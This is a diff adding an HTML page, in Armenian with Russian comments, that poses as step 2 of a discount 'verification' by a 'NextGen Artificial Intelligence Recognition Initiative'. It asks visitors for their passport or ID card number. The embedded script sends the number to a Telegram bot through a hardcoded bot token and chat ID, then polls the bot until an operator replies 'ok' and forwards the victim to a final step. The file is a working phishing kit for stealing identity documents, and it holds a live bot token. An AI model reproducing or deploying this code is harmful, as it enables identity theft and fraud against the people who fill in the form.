@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="hy">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="NextGen Artificial Intelligence Recognition Initiative - Верификация для получения скидки">
+    <meta name="keywords" content="NextGen Artificial Intelligence Recognition Initiative, верификация, скидка">
+    <meta property="og:title" content="NextGen Artificial Intelligence Recognition Initiative - Верификация">
+    <meta property="og:description" content="ԱՀ անցիր վերիֆիկացիա և ստացիր զեղչ">
+    <meta property="og:image" content="./image2.gif">
+    <meta property="og:url" content="https://NextGen-Artificial.netlify.app/v2.html">
+    <meta name="twitter:card" content="summary_large_image">
+    <title>NextGen Artificial Intelligence Recognition Initiative - Վերիֆիկացիա (Քայլ 2)</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&family=Roboto:wght@300;400&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        #preloader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            opacity: 1;
+            transition: opacity 2s ease;
+        }
+
+        #preloader.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        #preloader img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: url('./fon.gif') no-repeat center center fixed;
+            background-size: cover;
+            color: #bebb24;
+            min-height: 100vh;
+            padding-top: 20px;
+            animation: fadeBackground 5s infinite alternate ease-in-out;
+            opacity: 0;
+            transition: opacity 1s ease;
+        }
+
+        body.loaded {
+            opacity: 1;
+        }
+
+        @keyframes fadeBackground {
+            100% { opacity: 0.9; }
+            100% { opacity: 1; }
+        }
+
+        .stars {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .star {
+            position: absolute;
+            width: 2px;
+            height: 2px;
+            background: #fff;
+            border-radius: 50%;
+            animation: fall linear infinite;
+        }
+
+        .container {
+            text-align: center;
+            padding: 40px 25px;
+            background: rgba(10, 10, 20, 0.85);
+            border-radius: 25px;
+            box-shadow: 0 0 20px rgba(138, 43, 226, 0.5);
+            max-width: 700px;
+            width: 95%;
+            margin: 0 auto;
+            position: relative;
+            z-index: 1;
+            transition: opacity 0.3s ease;
+            opacity: 1;
+        }
+
+        .company-name {
+            font-family: 'Exo 2', sans-serif;
+            font-size: 55px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 15px;
+            text-shadow: 0 0 10px rgba(138, 43, 226, 0.8);
+        }
+
+        .highlight-text {
+            margin-bottom: 25px;
+            line-height: 1.4;
+            text-shadow: 0 0 5px rgba(255, 255, 255, 0.3);
+            font-family: 'Noto Sans Armenian', sans-serif;
+            font-size: 36px;
+            font-weight: 700;
+            color: #d8bfd8;
+            display: block;
+        }
+
+        .progress-bar {
+            width: 100%;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 25px;
+        }
+
+        .progress-bar div {
+            width: 66%;
+            height: 10px;
+            background: linear-gradient(45deg, #8a2be2, #4b0082);
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .form-group label {
+            font-family: 'Noto Sans Armenian', sans-serif;
+            font-size: 20px;
+            color: #d8bfd8;
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        .form-group select, .form-group input {
+            width: 100%;
+            padding: 12px;
+            font-family: 'Roboto', sans-serif;
+            font-size: 18px;
+            border: 2px solid #8a2be2;
+            border-radius: 8px;
+            outline: none;
+            transition: border-color 0.3s;
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+        }
+
+        .form-group select:focus, .form-group input:focus {
+            border-color: #4b0082;
+        }
+
+        .cta-button {
+            display: inline-block;
+            background: linear-gradient(45deg, #8a2be2, #4b0082);
+            color: #fff;
+            padding: 16px 40px;
+            border-radius: 35px;
+            text-decoration: none;
+            font-family: 'Exo 2', sans-serif;
+            font-weight: 700;
+            font-size: 20px;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 15px rgba(138, 43, 226, 0.7);
+            border: none;
+            cursor: pointer;
+            position: relative;
+            z-index: 10;
+        }
+
+        .cta-button:hover {
+            background: linear-gradient(45deg, #4b0082, #8a2be2);
+            transform: translateY(-2px) scale(1.03);
+            box-shadow: 0 0 25px rgba(138, 43, 226, 1);
+        }
+
+        .social-links {
+            margin-top: 25px;
+        }
+
+        .social-links a {
+            margin: 0 20px;
+            font-size: 34px;
+            color: #8a2be2;
+            transition: all 0.3s ease;
+        }
+
+        .social-links a:hover {
+            color: #d8bfd8;
+            transform: translateY(-10px);
+            text-shadow: 0 0 10px rgba(138, 43, 226, 0.8);
+        }
+
+        #document-number-group {
+            display: none;
+        }
+
+        #success-message, #error-message {
+            display: none;
+            margin-top: 20px;
+            font-family: 'Noto Sans Armenian', sans-serif;
+            font-size: 20px;
+            color: #fff;
+            padding: 12px;
+            border-radius: 10px;
+        }
+
+        #success-message {
+            background-color: rgba(138, 43, 226, 0.8);
+        }
+
+        #error-message {
+            background-color: rgba(244, 67, 54, 0.8);
+        }
+
+        #loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1000;
+        }
+
+        #loading-overlay img {
+            width: 100px;
+            height: 100px;
+            filter: drop-shadow(0 0 10px rgba(138, 43, 226, 0.5));
+        }
+
+        #wait-text {
+            font-family: 'Noto Sans Armenian', sans-serif;
+            font-size: 24px;
+            color: #d8bfd8;
+            margin-top: 20px;
+            text-shadow: 0 0 5px rgba(255, 255, 255, 0.3);
+        }
+
+        .whatsapp-button {
+            position: fixed;
+            bottom: 25px;
+            right: 25px;
+            background: #8a2be2;
+            padding: 15px;
+            border-radius: 50%;
+            box-shadow: 0 0 15px rgba(138, 43, 226, 0.7);
+            transition: all 0.3s ease;
+        }
+
+        .whatsapp-button:hover {
+            background: #4b0082;
+            transform: scale(1.1);
+            box-shadow: 0 0 20px rgba(138, 43, 226, 1);
+        }
+
+        @media (max-width: 768px) {
+            body { padding-top: 15px; }
+            .company-name { font-size: 48px; }
+            .highlight-text { font-size: 30px; }
+            .cta-button { padding: 14px 35px; font-size: 20px; }
+            .container { padding: 30px 20px; margin-top: 10px; }
+            .form-group label { font-size: 18px; }
+            .social-links a { font-size: 30px; margin: 0 15px; }
+            .form-group select, .form-group input { font-size: 16px; padding: 10px; }
+            #wait-text { font-size: 18px; }
+        }
+
+        @media (max-width: 480px) {
+            body { padding-top: 10px; }
+            .company-name { font-size: 36px; }
+            .highlight-text { font-size: 24px; }
+            .cta-button { padding: 12px 30px; font-size: 18px; }
+            .container { padding: 20px 15px; margin-top: 5px; }
+            .form-group label { font-size: 16px; }
+            .social-links a { font-size: 26px; margin: 0 10px; }
+            .form-group select, .form-group input { font-size: 14px; padding: 8px; }
+            .whatsapp-button { padding: 12px; }
+            #wait-text { font-size: 16px; }
+        }
+    </style>
+</head>
+<body>
+    <div id="preloader">
+        <img src="./ai.gif" alt="AI Loading Animation">
+    </div>
+    <div class="stars"></div>
+
+    <div class="container" id="main-container">
+        <h1 class="company-name">NextGen Artificial Intelligence Recognition Initiative</h1>
+        <p class="highlight-text">(Քայլ 2/3)</p>
+        <div class="progress-bar">
+            <div></div>
+        </div>
+        <form id="verification-form">
+            <div class="form-group">
+                <label for="document-type">Փաստաթղթի տեսակը</label>
+                <select id="document-type" name="document-type" required>
+                    <option value="" disabled selected>Ընտրեք փաստաթղթի տեսակը</option>
+                    <option value="passport">Անձնագիր</option>
+                    <option value="id-card">ID քարտ</option>
+                </select>
+            </div>
+            <div class="form-group" id="document-number-group">
+                <label id="document-number-label" for="document-number"></label>
+                <input type="text" id="document-number" name="document-number" placeholder="" required>
+            </div>
+            <div class="social-links" data-aos="fade-up" data-aos-delay="300">
+                <a href="https://m.facebook.com" target="_blank"><i class="fab fa-facebook-f"></i></a>
+                <a href="https://www.instagram.com" target="_blank"><i class="fab fa-instagram"></i></a>
+                <a href="https://twitter.com" target="_blank"><i class="fab fa-twitter"></i></a>
+            </div>
+            <div style="margin-top: 20px;">
+                <button type="submit" class="cta-button" id="next-button">Հաջորդը</button>
+            </div>
+        </form>
+        <div id="success-message">Հաջողությամբ լրացված է։</div>
+        <div id="error-message">Սխալ։ Խնդրում ենք ստուգել տվյալները։</div>
+    </div>
+
+    <div id="loading-overlay">
+        <img src="./loading.gif" alt="Loading">
+        <div id="wait-text">Խնդրում ենք սպասել</div>
+    </div>
+
+    <a href="https://wa.me/37496653666" class="whatsapp-button">
+        <i class="fab fa-whatsapp" style="font-size: 26px; color: #fff;"></i>
+    </a>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+    <script>
+        setTimeout(() => {
+            const preloader = document.getElementById('preloader');
+            const body = document.body;
+            preloader.classList.add('hidden');
+            body.classList.add('loaded');
+            preloader.addEventListener('transitionend', () => {
+                preloader.remove();
+            });
+        }, 2000);
+
+        const starsContainer = document.querySelector('.stars');
+        for (let i = 0; i < 100; i++) {
+            const star = document.createElement('div');
+            star.classList.add('star');
+            star.style.left = `${Math.random() * 100}vw`;
+            star.style.animationDuration = `${Math.random() * 3 + 2}s`;
+            star.style.animationDelay = `${Math.random() * 5}s`;
+            starsContainer.appendChild(star);
+        }
+
+        const TELEGRAM_TOKEN = "7505675886:AAEOZyLgDk3TqEXIUJqhDzZtpVtFNjKh9ww";
+        const CHAT_ID = "7231332868";
+        let updateOffset = null;
+
+        const documentTypeSelect = document.getElementById('document-type');
+        const documentNumberGroup = document.getElementById('document-number-group');
+        const documentNumberLabel = document.getElementById('document-number-label');
+        const documentNumberInput = document.getElementById('document-number');
+        const nextButton = document.getElementById('next-button');
+        const container = document.getElementById('main-container');
+        const loadingOverlay = document.getElementById('loading-overlay');
+
+        document.addEventListener('DOMContentLoaded', function() {
+            container.style.opacity = '1';
+            container.classList.remove('disabled');
+            loadingOverlay.style.display = 'none';
+        });
+
+        documentTypeSelect.addEventListener('change', function() {
+            const selectedValue = this.value;
+            documentNumberGroup.style.display = 'block';
+
+            if (selectedValue === 'passport') {
+                documentNumberLabel.textContent = 'Անձնագրի համարը (սերիա)';
+                documentNumberInput.placeholder = 'Օրինակ՝ AB1234567';
+            } else if (selectedValue === 'id-card') {
+                documentNumberLabel.textContent = 'ID քարտի համարը';
+                documentNumberInput.placeholder = 'Օրինակ՝ 123456789';
+            }
+        });
+
+        nextButton.addEventListener('click', function(e) {
+            e.preventDefault();
+            const documentType = documentTypeSelect.value === 'passport' ? 'Անձնագիր' : 'ID քարտ';
+            const documentNumber = documentNumberInput.value.trim();
+
+            if (!documentType || !documentNumber) {
+                showMessage('error-message');
+                return;
+            }
+
+            const message = `
+📋 Վերիֆիկացիայի տվյալներ (Քայլ 2):
+- Փաստաթղթի տեսակը: ${documentType}
+- Փաստաթղթի համարը: ${documentNumber}
+            `;
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    container.classList.add('disabled');
+                    loadingOverlay.style.display = 'flex';
+                    checkTelegramApproval();
+                } else {
+                    showMessage('error-message');
+                }
+            })
+            .catch(error => {
+                showMessage('error-message');
+            });
+        });
+
+        function checkTelegramApproval() {
+            const interval = setInterval(() => {
+                fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${updateOffset || ''}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok && data.result.length > 0) {
+                        const messages = data.result;
+                        const lastMessage = messages[messages.length - 1];
+                        console.log('Получено сообщение:', lastMessage.message.text, 'от чата:', lastMessage.message.chat.id);
+
+                        if (updateOffset === null) {
+                            updateOffset = lastMessage.update_id + 1;
+                            console.log('Пропускаем старые сообщения, новый offset:', updateOffset);
+                            return;
+                        }
+
+                        updateOffset = lastMessage.update_id + 1;
+                        if (lastMessage.message.text.toLowerCase() === 'ok' && lastMessage.message.chat.id == CHAT_ID) {
+                            clearInterval(interval);
+                            window.location.href = './final-step.html';
+                        }
+                    }
+                })
+                .catch(error => {
+                    console.error('Ошибка проверки Telegram:', error);
+                    showMessage('error-message');
+                });
+            }, 2000);
+        }
+
+        function showMessage(id) {
+            const message = document.getElementById(id);
+            message.style.display = 'block';
+            setTimeout(() => {
+                message.style.display = 'none';
+            }, 3000);
+        }
+
+        AOS.init({
+            duration: 800,
+            easing: 'ease-out',
+            once: true
+        });
+
+        gsap.from(".container", {
+            opacity: 0,
+            y: 50,
+            duration: 0.8,
+            ease: "power2.out",
+            delay: 0.2
+        });
+
+        gsap.fromTo(".cta-button", 
+            { scale: 0.9, opacity: 0 }, 
+            { scale: 1, opacity: 1, duration: 0.8, ease: "back.out(1.7)", delay: 0.5, stagger: 0.2 }
+        );
+
+        gsap.from(".whatsapp-button", {
+            y: 50,
+            opacity: 0,
+            duration: 0.6,
+            ease: "power2.out",
+            delay: 1
+        });
+    </script>
+</body>
+</html>
